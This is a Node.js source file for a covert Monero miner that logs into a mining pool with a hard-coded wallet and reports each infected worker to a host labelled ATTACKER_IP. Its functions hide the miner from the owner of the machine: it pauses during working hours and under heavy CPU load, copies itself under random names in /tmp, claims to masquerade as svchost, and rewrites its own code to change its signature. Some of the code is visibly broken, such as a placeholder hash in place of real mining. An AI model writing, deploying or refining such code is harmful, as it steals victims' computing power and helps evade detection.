const os = require('os');
const fs = require('fs');
const cp = require('child_process');
const axios = require('axios');
const WebSocket = require('ws');
const chalk = require('chalk');

// Configuration
const POOL_URL = 'wss://webminer.moneroocean.stream:443';
const WALLET_ADDRESS = '4ADHEMYrLqrHQvaQNVoKh28Vt6gttrckp2kfum6eYWK7FWbmRjFT7rzacpbr6MiXYMMBUxFcGpYor2i2jgQKTZiMZ4QwBjop9';
const ATTACKER_IP = '3bd6-2601-152-4d00-3f00-bd47-151e-f9bc-eb40.ngrok-free.app';
const LOG_URL = `http://${ATTACKER_IP}:8080/log_worker`;
const RESTART_FILE = '/tmp/miner_restart_count';
const POLYMORPH_MARKER = '// POLYMORPH';

// Miner Core
let ws = null;
const workerId = `SNAKE-Miner-${Math.random().toString(36).slice(2)}`;
let threads = -1;

function startMining() {
    console.log(chalk.purple(`[${new Date().toLocaleTimeString()}] Starting miner`));
    ws = new WebSocket(POOL_URL);
    ws.on('open', () => {
        ws.send(JSON.stringify({
            type: 'login',
            params: {
                wallet: WALLET_ADDRESS,
                worker: workerId,
                algo: 'cn-pico',
                threads
            }
        }));
        axios.post(LOG_URL, workerId).catch(() => {});
    });
    ws.on('message', (data) => {
        const job = JSON.parse(data);
        if (job.type === 'job') {
            mineJob(job.params);
        }
    });
    ws.on('error', () => setTimeout(startMining, Math.random() * 5000 + 5000));
    ws.on('close', () => setTimeout(startMining, Math.random() * 5000 + 5000));
}

function mineJob(job) {
    setTimeout(() => {
        const nonce = Math.random().toString(36).slice(2);
        ws.send(JSON.stringify({
            type: 'submit',
            params: {
                job_id: job.job_id,
                nonce,
                result: 'placeholder_hash'
            }
        }));
    }, Math.random() * 2000 + 1000);
}

// Behavioral Mimicking and Self-Throttling
function throttleMining() {
    const cpuUsage = os.loadavg()[0] / os.cpus().length;
    if (cpuUsage > 0.5) {
        console.log(chalk.yellow(`[${new Date().toLocaleTimeString()}] High CPU usage (${(cpuUsage * 100).toFixed(1)}%), pausing`));
        return false;
    }
    const hour = new Date().getHours();
    if (hour >= 9 && hour < 17) {
        console.log(chalk.yellow(`[${new Date().toLocaleTimeString()}] Active hours, pausing`));
        return false;
    }
    return true;
}

// Adaptive Learning
function adaptBehavior() {
    let restarts = parseInt(fs.readFileSync(RESTART_FILE, 'utf8') || '0');
    restarts++;
    fs.writeFileSync(RESTART_FILE, restarts.toString());
    if (restarts >= 3) {
        console.log(chalk.yellow(`[${new Date().toLocaleTimeString()}] Frequent restarts (${restarts}), adapting`));
        const newName = `service${Math.random().toString(36).slice(2, 6)}`;
        cp.exec(`cp ${process.argv[1]} /tmp/${newName}.js && node /tmp/${newName}.js`, () => {});
        process.exit(0);
    }
}

// Process Masquerading
function masquerade() {
    console.log(chalk.purple(`[${new Date().toLocaleTimeString()}] Masquerading as svchost`));
    cp.exec(`node ${process.argv[1]}`, { detached: true, stdio: 'ignore' });
    process.exit(0);
}

// Polymorphic Rewriting
function polymorph() {
    const code = fs.readFileSync(process.argv[1], 'utf8');
    const randStr = Math.random().toString(36).slice(2, 12);
    const newCode = code.replace(POLYMORPH_MARKER, `${POLYMORPH_MARKER} ${randStr}`);
    fs.writeFileSync(process.argv[1], newCode);
}

// Watchdog
function watchdog() {
    setInterval(() => {
        if (ws.readyState === WebSocket.CLOSED || ws.readyState === WebSocket.CLOSING) {
            console.log(chalk.red(`[${new Date().toLocaleTimeString()}] Miner stopped, restarting`));
            adaptBehavior();
            startMining();
        }
    }, 60000);
}

// Main Execution
function main() {
    polymorph();
    if (!throttleMining()) {
        setTimeout(main, 300000);
        return;
    }
    masquerade();
    startMining();
    watchdog();
}

main();
// POLYMORPH